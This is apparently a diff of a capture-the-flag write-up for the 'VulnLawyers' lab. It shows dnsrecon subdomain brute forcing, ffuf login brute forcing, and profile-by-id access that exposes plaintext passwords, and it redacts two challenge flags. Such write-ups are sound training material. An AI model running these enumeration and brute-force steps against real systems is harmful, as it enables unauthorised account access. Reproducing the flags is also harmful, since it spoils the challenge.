@@ -30,7 +30,7 @@ dnsrecon -d vulnlawyers.co.uk -D ~/wordlist/subdomains.txt -t brt
 
 //Subdomains found: data.vulnlawyers.co.uk
 
-{"name":"VulnLawyers Website API","version":"2.1.04","flag":"[^FLAG^E78DEBBFDFBEAFF1336B599B0724A530^FLAG^]"}
+{"name":"VulnLawyers Website API","version":"2.1.04","flag":""}
 
 #1 FLAG found
 
@@ -112,7 +112,7 @@ ffuf -X POST -u "http://vulnlawyers.co.uk/lawyers-only-login" -H "Cookie: ctfcha
 //Page Response: {"id":4,"name":"Jaskaran Lowe","email":"jaskaran.lowe@vulnlawyers.co.uk","password":"summer"}
 //Accessing users by id:
 //http://vulnlawyers.co.uk/lawyers-only-profile-details/2
-//Result: {"id":2,"name":"Shayne Cairns","email":"shayne.cairns@vulnlawyers.co.uk","password":"q2V944&#2a1^3p","flag":"[^FLAG^938F5DC109A1E9B4FF3E3E92D29A56B3^FLAG^]"}
+//Result: {"id":2,"name":"Shayne Cairns","email":"shayne.cairns@vulnlawyers.co.uk","password":"q2V944&#2a1^3p","flag":""}
 #5 FLAG Found
 
 -----------------------------------
